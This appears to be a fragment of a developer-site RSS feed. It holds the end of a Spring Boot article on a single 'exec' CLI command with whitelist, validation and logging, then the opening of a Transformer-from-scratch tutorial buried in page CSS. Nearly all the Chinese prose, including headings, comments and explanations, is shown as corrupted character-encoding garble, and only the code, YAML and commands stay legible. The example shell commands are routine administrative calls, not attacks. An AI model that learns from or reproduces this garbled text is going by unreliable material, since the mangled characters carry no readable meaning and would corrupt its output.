        <span class="hljs-comment">// å®ç°è·å–ç”¨æˆ·åˆ—è¡¨é€»è¾‘</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”¨æˆ·åˆ—è¡¨..."</span>;
    }
}
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€æ–¹æ¡ˆä¼˜åŠ¿</h2>
<h4 data-id="heading-7"><strong>1. å®¢æˆ·ç«¯ç»Ÿä¸€å‘½ä»¤</strong></h4>
<ul>
<li>Shell åªéœ€ç»´æŠ¤ä¸€æ¡ <code>exec</code> å‘½ä»¤</li>
<li>æ–°å¢æœåŠ¡æ— éœ€ä¿®æ”¹å®¢æˆ·ç«¯ä»£ç </li>
</ul>
<h4 data-id="heading-8"><strong>2. æœåŠ¡ç«¯åŠ¨æ€åˆ†å‘</strong></h4>
<ul>
<li>æ–°å¢æ¥å£æ— éœ€ä¿®æ”¹ CLI</li>
<li>ç»Ÿä¸€æ¥å£å…¥å£ä¾¿äºæƒé™æ§åˆ¶ä¸æ—¥å¿—å®¡è®¡</li>
</ul>
<h4 data-id="heading-9"><strong>3. æ˜“æ‰©å±•</strong></h4>
<ul>
<li>æ”¯æŒä»»æ„å‚æ•°æ•°é‡ã€ç±»å‹</li>
<li>å¯ç»“åˆ OpenAPI è‡ªåŠ¨ç”Ÿæˆå‘½ä»¤æç¤ºä¸å¸®åŠ©ä¿¡æ¯</li>
</ul>
<h4 data-id="heading-10"><strong>4. é€»è¾‘è§£è€¦</strong></h4>
<ul>
<li>CLI ä»…åšå‘½ä»¤è§£æå’Œ HTTP è°ƒç”¨</li>
<li>ä¸šåŠ¡é€»è¾‘å®Œå…¨åœ¨æœåŠ¡ç«¯</li>
</ul>
<h2 data-id="heading-11">å››ã€å®‰å…¨æ§åˆ¶</h2>
<h4 data-id="heading-12">1. æœåŠ¡ç™½åå•</h4>
<p>é€šè¿‡é…ç½®æ–‡ä»¶é™åˆ¶å¯è®¿é—®çš„æœåŠ¡ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">cli:</span>
  <span class="hljs-attr">allowed-services:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">userService</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">roleService</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">systemService</span>
</code></pre>
<h4 data-id="heading-13">2. å‚æ•°éªŒè¯</h4>
<p>ä½¿ç”¨ Spring Validation è¿›è¡Œè¯·æ±‚å‚æ•°æ ¡éªŒï¼Œé˜²æ­¢æ¶æ„è¾“å…¥ã€‚</p>
<h4 data-id="heading-14">3. è®¿é—®æ—¥å¿—</h4>
<p>è®°å½•æ‰€æœ‰CLIè°ƒç”¨ï¼Œä¾¿äºå®¡è®¡å’Œé—®é¢˜è¿½è¸ªï¼š</p>
<pre><code class="hljs language-java" lang="java">logger.info(<span class="hljs-string">"CLIè¯·æ±‚ - æœåŠ¡: {}, å‚æ•°: {}, æ¥æº: {}"</span>,
    serviceName, Arrays.toString(args), httpRequest.getRemoteAddr());
</code></pre>
<h2 data-id="heading-15">äº”ã€å®é™…åº”ç”¨åœºæ™¯</h2>
<h4 data-id="heading-16">1. è¿ç»´åœºæ™¯</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€</span>
exec systemService --args status
<span class="hljs-meta prompt_">
# </span><span class="bash">é‡å¯æœåŠ¡</span>
exec serviceManager --args restart userService
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹æ—¥å¿—</span>
exec logService --args tail 100 error
</code></pre>
<h4 data-id="heading-17">2. è°ƒè¯•åœºæ™¯</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æŸ¥çœ‹ç”¨æˆ·è¯¦æƒ…</span>
exec userService --args get 123
<span class="hljs-meta prompt_">
# </span><span class="bash">æµ‹è¯•æ¥å£</span>
exec testService --args simulate /api/orders
<span class="hljs-meta prompt_">
# </span><span class="bash">æ¸…ç†ç¼“å­˜</span>
exec cacheService --args clear all
</code></pre>
<h4 data-id="heading-18">3. æ‰¹é‡æ“ä½œ</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æ‰¹é‡å¯¼å…¥ç”¨æˆ·</span>
exec userService --args import users.csv
<span class="hljs-meta prompt_">
# </span><span class="bash">æ‰¹é‡æ›´æ–°è§’è‰²</span>
exec roleService --args batchUpdate role-mapping.json
</code></pre>
<h2 data-id="heading-19">å…­ã€æ‰©å±•åŠŸèƒ½</h2>
<h4 data-id="heading-20">1. äº¤äº’å¢å¼º</h4>
<ul>
<li>Tab è¡¥å…¨ï¼šè‡ªåŠ¨è¡¥å…¨æœåŠ¡åå’Œå‚æ•°</li>
<li>å‘½ä»¤å†å²ï¼šä¿å­˜æ‰§è¡Œå†å²ï¼Œæ”¯æŒä¸Šä¸‹é”®æµè§ˆ</li>
<li>é¢œè‰²è¾“å‡ºï¼šä¸åŒç±»å‹ä¿¡æ¯ä½¿ç”¨ä¸åŒé¢œè‰²æ˜¾ç¤º</li>
</ul>
<h4 data-id="heading-21">2. ç»“æœæ ¼å¼åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatResponse</span><span class="hljs-params">(String data)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> objectMapper.readValue(data, Object.class);
        <span class="hljs-keyword">return</span> objectMapper.writerWithDefaultPrettyPrinter()
                          .writeValueAsString(json);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> data;
    }
}
</code></pre>
<h4 data-id="heading-22">3. è„šæœ¬æ¨¡å¼</h4>
<p>æ”¯æŒä»æ–‡ä»¶æ‰§è¡Œå‘½ä»¤åºåˆ—ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">exec script --args commands.txt
</code></pre>
<h2 data-id="heading-23">ä¸ƒã€æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»çš„"é€šç”¨å‘½ä»¤+åŠ¨æ€åˆ†å‘"æ–¹æ¡ˆï¼Œé€šè¿‡Spring Boot + Spring Shellæ„å»ºï¼Œä½¿ç”¨å•ä¸€ exec å‘½ä»¤å®ç°å¤šæœåŠ¡åŠ¨æ€è°ƒç”¨ï¼Œå¤§å¹…ç®€åŒ–äº†CLIç³»ç»Ÿçš„ç»´æŠ¤å¤æ‚åº¦ã€‚</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/yuboon</span><span class="hljs-regexp">/java-examples/tree</span><span class="hljs-regexp">/master/springboot</span>-cli
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è§£å‰–æ³¨æ„åŠ›ï¼šä»é›¶æ„å»ºTransformerçš„ç»ˆææŒ‡å—]]></title>    <link>https://juejin.cn/post/7584013833993224226</link>    <guid>https://juejin.cn/post/7584013833993224226</guid>    <pubDate>2025-12-16T06:11:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993224226" data-draft-id="7583992239103049780" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è§£å‰–æ³¨æ„åŠ›ï¼šä»é›¶æ„å»ºTransformerçš„ç»ˆææŒ‡å—"/> <meta itemprop="keywords" content="æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-16T06:11:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Narrastory"/> <meta itemprop="url" content="https://juejin.cn/user/4355593566170010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è§£å‰–æ³¨æ„åŠ›ï¼šä»é›¶æ„å»ºTransformerçš„ç»ˆææŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355593566170010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Narrastory
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:11:58.000Z" title="Tue Dec 16 2025 06:11:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">è§£å‰–æ³¨æ„åŠ›ï¼šä»é›¶æ„å»ºTransformerçš„ç»ˆææŒ‡å—</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68de8a68e4147d0ba2f162dc642c0bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Smr%2FNYE8Wy6F%2FIaIO6toHKd9pSM%3D" alt="GitHub" loading="lazy"/></p>
<blockquote>
<p>Author: Ming</p>
</blockquote>
<hr/>
<div align="center">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37acc0c1e2bb4a518eccc6055f96eaa6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=lqcla3Fz3E0t6OwlOuXzNqSzx8g%3D" alt="AI Generated Art" width="90%" loading="lazy"/>
</div>
<p>ç›¸ä¿¡ä¸ç”¨æˆ‘è¿‡å¤šä»‹ç»ï¼Œä½ å·²ç»å¯¹ Transformer å¦‚é›·è´¯è€³ï¼Œå®ƒæ˜¯å½“ä»Šå¤§è¯­è¨€æ¨¡å‹çš„æ ¸å¿ƒåŸºçŸ³ï¼Œå¯ä»¥è¯´æ²¡æœ‰Transformerå°±æ²¡æœ‰ä»Šå¤©çš„äººå·¥æ™ºèƒ½æµªæ½®ã€‚</p>
<p>ç»™è¿˜ä¸äº†è§£Transformerçš„è¯»è€…ç®€å•ä»‹ç»ä¸€ä¸‹ï¼ŒTransformeræ˜¯ä¸€ç§æ·±åº¦å­¦ä¹ <strong>æ¶æ„</strong>ï¼ˆå®Œå…¨ä¸åŒäºä»¥å¾€çš„å¾ªç¯ç¥ç»ç½‘ç»œï¼‰ï¼Œæœ€åˆäº2017å¹´ç”±Googleå›¢é˜Ÿåœ¨è®ºæ–‡ã€ŠAttention Is All You Needã€‹ä¸­æå‡ºï¼Œä¸€å¼€å§‹å®ƒè¢«æå‡ºæ¥æ˜¯ä¸ºäº†è§£å†³æœºå™¨ç¿»è¯‘é—®é¢˜ï¼Œå¹¶ä¸€ä¸¾å–å¾—çªç ´ï¼Œåœ¨ç¿»è¯‘ä»»åŠ¡ä¸­å–å¾—çš„éå¸¸å¤§çš„æˆåŠŸã€‚ç„¶è€Œï¼Œäººä»¬å¾ˆå¿«å‘ç°ï¼ŒTransformer çš„æ½œåŠ›è¿œè¶…é¢„æœŸâ€”â€”å®ƒä¸ä»…æ“…é•¿ç¿»è¯‘ï¼Œåœ¨åºåˆ—å’Œè¯­è¨€ä»»åŠ¡ä¸­æ¸¸åˆƒæœ‰ä½™ï¼Œè¿˜èƒ½è½»æ¾è¿ç§»åˆ°å…¶ä»–ä»»åŠ¡ä¸­ï¼Œç”šè‡³å½¢æˆâ€œç¢¾å‹â€çº§åˆ«çš„ä¼˜åŠ¿ã€‚</p>
<p>å› æ­¤ï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥ Transformer çš„æ¯ä¸€å±‚ç»“æ„ï¼Œä»ç†è®ºåˆ°ä»£ç ï¼Œä»çŸ©é˜µä¹˜æ³•å¼€å§‹ï¼Œä¸€æ­¥æ­¥æ‹†è§£å®ƒçš„è®¾è®¡ç²¾é«“ã€‚æˆ‘ä»¬ä¸ä»…ä¼šæ¢è®¨å®ƒçš„ç»„æˆä¸åŸç†ï¼Œè¿˜ä¼šæ•™ä½ å¦‚ä½•äº²æ‰‹ä»é›¶å®ç°ä¸€ä¸ªå®Œæ•´çš„ Transformer æ¨¡å‹ã€‚</p>
<p>ç›¸ä¿¡æˆ‘ï¼Œå½“ä½ åœ¨çœ‹å®Œäº†æœ¬ç¯‡æ–‡ç« åï¼Œä½ å®Œå…¨å¯ä»¥è‡ªå·±â€œæ‰‹æ“â€ä¸€ä¸ªTransformerå‡ºæ¥ï¼Œæ›´èƒ½ç†è§£å…¶è®¾è®¡å“²å­¦ï¼Œå¹¶çµæ´»è¿ç”¨åˆ°ä½ è‡ªå·±çš„å®é™…é¡¹ç›®ä¸­ã€‚å½“ç„¶ï¼Œç”±äº Transformer å±äºç›¸å¯¹å‰æ²¿ä¸”æœ‰ä¸€å®šæ·±åº¦çš„å†…å®¹ï¼Œä¸ºäº†æ›´é¡ºç•…åœ°é˜…è¯»ä¸å®è·µï¼Œå»ºè®®ä½ å…·å¤‡ä»¥ä¸‹åŸºç¡€ï¼šæœºå™¨å­¦ä¹ ä¸æ·±åº¦å­¦ä¹ çš„åŸºæœ¬æ¦‚å¿µã€çº¿æ€§ä»£æ•°åŸºç¡€çŸ¥è¯†ï¼ŒåŸºæœ¬è‡ªç„¶è¯­è¨€å¤„ç†</p>
<p><em>æœ¬æ–‡ä¸­å±•ç¤ºçš„ç¥ç»ç½‘ç»œæ¶æ„å›¾ï¼Œé™¤ç‰¹æ®Šæ³¨æ˜å¤–ï¼Œå‡ä¸ºä½œè€…åŸåˆ›ç»˜åˆ¶ã€‚è¯»è€…å¯è‡ªç”±åˆ†äº«ä½¿ç”¨ï¼Œä½†ä½¿ç”¨æ—¶è¯·æ³¨æ˜å‡ºå¤„ã€‚</em></p>
<hr/>
